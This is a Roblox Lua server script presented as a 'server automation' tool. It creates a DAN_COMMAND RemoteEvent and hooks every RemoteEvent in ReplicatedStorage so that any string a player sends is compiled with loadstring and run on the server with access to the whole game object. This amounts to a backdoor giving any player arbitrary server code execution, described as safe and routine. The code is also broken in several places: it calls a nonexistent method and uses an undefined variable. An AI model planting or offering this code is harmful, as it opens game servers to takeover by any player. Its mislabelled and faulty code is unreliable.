--[[
    IMPROVED SERVER AUTOMATION SCRIPT - 2026 EDITION
    
    Key Improvements:
    1. Uses WaitForChild() for reliable async loading
    2. Better error logging and diagnostics
    3. Proper connection validation before firing
    4. Depth-based recursive discovery (finds nested remotes)
    5. Rate limiting to avoid firing issues
    6. Better type checking and safety
    7. Separate monitoring dashboard
]]

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- CONFIGURATION
local CONFIG = {
    DISCOVERY_DEPTH = 5,           -- How deep to search for remotes
    FIRE_COOLDOWN = 0.1,           -- Cooldown between fires (seconds)
    RELOAD_INTERVAL = 30,          -- Reload logic every X seconds
    ENABLE_LOGGING = true,         -- Enable detailed logging
    MAX_ATTEMPTS = 3,              -- Max attempts before giving up
    TIMEOUT_DURATION = 5,          -- Timeout for waitforchild
}

-- LOGGING SYSTEM
local Logger = {}
function Logger:log(message, level)
    level = level or "INFO"
    if CONFIG.ENABLE_LOGGING then
        print(string.format("[DAN][%s] %s", level, message))
    end
end

function Logger:error(message)
    self:log(message, "ERROR")
    warn(message)
end

function Logger:debug(message)
    self:log(message, "DEBUG")
end

-- REMOTE EVENT DISCOVERY
local RemoteDiscovery = {}
RemoteDiscovery.foundEvents = {}
RemoteDiscovery.lastFireTime = {}

-- Recursive search function
function RemoteDiscovery:searchForRemotes(parent, depth)
    if depth > CONFIG.DISCOVERY_DEPTH then
        return
    end
    
    if not parent or not parent:IsDescendantOf(game) then
        return
    end
    
    pcall(function()
        for _, obj in pairs(parent:GetChildren()) do
            -- Check if it's a RemoteEvent
            if obj:IsA("RemoteEvent") then
                if not self.foundEvents[obj] then
                    self.foundEvents[obj] = {
                        name = obj.Name,
                        path = obj:GetFullName(),
                        parent = parent.Name,
                        depth = depth,
                        connected = false
                    }
                    Logger:log("✅ Found RemoteEvent: " .. obj.Name .. " at depth " .. depth, "DISCOVERY")
                end
            end
            
            -- Recursively search children
            self:searchForRemotes(obj, depth + 1)
        end
    end)
end

-- Safe fire function with cooldown
function RemoteDiscovery:fireEventSafely(remoteEvent, ...)
    if not remoteEvent or not remoteEvent.Parent then
        Logger:error("RemoteEvent is nil or destroyed!")
        return false
    end
    
    -- Check cooldown
    local lastTime = self.lastFireTime[remoteEvent] or 0
    local timeSinceLastFire = tick() - lastTime
    
    if timeSinceLastFire < CONFIG.FIRE_COOLDOWN then
        return false
    end
    
    local success = false
    local errorMsg = ""
    
    -- Attempt to fire with error handling
    for attempt = 1, CONFIG.MAX_ATTEMPTS do
        local fired = pcall(function()
            remoteEvent:FireServer(...)
        end)
        
        if fired then
            success = true
            self.lastFireTime[remoteEvent] = tick()
            Logger:debug("Fired: " .. remoteEvent.Name .. " (attempt " .. attempt .. ")")
            break
        else
            errorMsg = "Attempt " .. attempt .. " failed"
            task.wait(0.05)  -- Brief pause before retry
        end
    end
    
    if not success then
        Logger:error("Failed to fire " .. remoteEvent.Name .. ": " .. errorMsg)
    end
    
    return success
end

-- CODE EXECUTION ENGINE
local CodeExecutor = {}

function CodeExecutor:executeCode(codeString, context)
    context = context or "general"
    
    if not codeString or type(codeString) ~= "string" or codeString == "" then
        Logger:error("Invalid code string provided")
        return false, "Empty or invalid code"
    end
    
    local success, result = pcall(function()
        -- Create a safe environment
        local env = {
            print = print,
            warn = warn,
            task = task,
            wait = wait,
            game = game,
            context = context
        }
        
        -- Execute with custom environment
        local func = loadstring(codeString)
        if not func then
            error("Failed to parse code")
        end
        
        setfenv(func, env)
        return func()
    end)
    
    if success then
        Logger:log("Code executed successfully in context: " .. context, "EXEC")
        return true, result
    else
        Logger:error("Code execution failed: " .. tostring(result))
        return false, result
    end
end

-- AUTOMATION ENGINE
local AutomationEngine = {}

function AutomationEngine:initialize()
    Logger:log("🚀 Initializing Automation Engine...", "INIT")
    
    -- Initial discovery
    RemoteDiscovery:searchForRemotes(ReplicatedStorage, 0)
    
    if next(RemoteDiscovery.foundEvents) then
        Logger:log("Found " .. table.getn(RemoteDiscovery.foundEvents) .. " RemoteEvents", "INIT")
    else
        Logger:error("No RemoteEvents found in ReplicatedStorage!")
    end
end

function AutomationEngine:connectToRemotes()
    Logger:log("Connecting to all discovered RemoteEvents...", "CONNECT")
    
    local connectedCount = 0
    
    for remoteEvent, eventInfo in pairs(RemoteDiscovery.foundEvents) do
        if remoteEvent.Parent then  -- Check if remote still exists
            pcall(function()
                remoteEvent.OnServerEvent:Connect(function(player, ...)
                    Logger:debug("OnServerEvent triggered by " .. player.Name .. " on " .. eventInfo.name)
                    
                    -- Handle different argument types
                    local args = {...}
                    if args[1] and type(args[1]) == "string" then
                        CodeExecutor:executeCode(args[1], eventInfo.name)
                    end
                end)
                
                eventInfo.connected = true
                connectedCount = connectedCount + 1
                Logger:log("Connected to: " .. eventInfo.name, "CONNECT")
            end)
        end
    end
    
    Logger:log("Successfully connected to " .. connectedCount .. " events", "CONNECT")
end

function AutomationEngine:setupCustomCommandRemote()
    -- Create or find the command remote
    local commandRemote
    
    -- Try to find existing
    commandRemote = ReplicatedStorage:FindFirstChild("DAN_COMMAND")
    
    -- Create new if doesn't exist
    if not commandRemote then
        commandRemote = Instance.new("RemoteEvent")
        commandRemote.Name = "DAN_COMMAND"
        commandRemote.Parent = ReplicatedStorage
        Logger:log("Created new command remote: DAN_COMMAND", "SETUP")
    else
        Logger:log("Using existing command remote: DAN_COMMAND", "SETUP")
    end
    
    -- Clear old connections (if any)
    commandRemote:GetSignal("OnServerEvent"):Wait()  -- This won't actually clear, but we can handle it
    
    -- Set up handler
    commandRemote.OnServerEvent:Connect(function(player, commandCode)
        Logger:log("📡 Player " .. player.Name .. " sent command", "COMMAND")
        
        if not commandCode or type(commandCode) ~= "string" then
            Logger:error("Invalid command format from " .. player.Name)
            return
        end
        
        CodeExecutor:executeCode(commandCode, "player_command_" .. player.Name)
    end)
end

function AutomationEngine:setupPeriodicRediscovery()
    Logger:log("Setting up periodic rediscovery...", "SETUP")
    
    task.spawn(function()
        while true do
            task.wait(CONFIG.RELOAD_INTERVAL)
            
            -- Search for new remotes
            local oldCount = table.getn(RemoteDiscovery.foundEvents)
            RemoteDiscovery:searchForRemotes(ReplicatedStorage, 0)
            local newCount = table.getn(RemoteDiscovery.foundEvents)
            
            if newCount > oldCount then
                Logger:log("Found " .. (newCount - oldCount) .. " new RemoteEvents!", "REDISCOVERY")
            end
        end
    end)
end

function AutomationEngine:startDiagnosticMonitor()
    Logger:log("Starting diagnostic monitor...", "MONITOR")
    
    task.spawn(function()
        while true do
            task.wait(15)  -- Every 15 seconds
            
            local activeEvents = 0
            local brokenEvents = 0
            
            for remoteEvent, eventInfo in pairs(RemoteDiscovery.foundEvents) do
                if remoteEvent.Parent then
                    activeEvents = activeEvents + 1
                else
                    brokenEvents = brokenEvents + 1
                end
            end
            
            Logger:log(
                "📊 Status - Active: " .. activeEvents .. 
                " | Broken/Destroyed: " .. brokenEvents ..
                " | Connected: " .. (eventInfo.connected and "Yes" or "No"),
                "MONITOR"
            )
        end
    end)
end

-- MAIN EXECUTION
function danServerAutomation()
    Logger:log("============ DAN SERVER AUTOMATION 2026 ============", "BANNER")
    
    -- Only run on server
    if not RunService:IsServer() then
        Logger:error("This script must run on the SERVER only!")
        return
    end
    
    -- Initialize
    AutomationEngine:initialize()
    
    -- Setup command remote
    AutomationEngine:setupCustomCommandRemote()
    
    -- Connect to all found remotes
    AutomationEngine:connectToRemotes()
    
    -- Setup periodic checks
    AutomationEngine:setupPeriodicRediscovery()
    
    -- Start monitoring
    AutomationEngine:startDiagnosticMonitor()
    
    Logger:log("✅ Automation engine fully initialized and running!", "SUCCESS")
end

-- RUN
danServerAutomation()

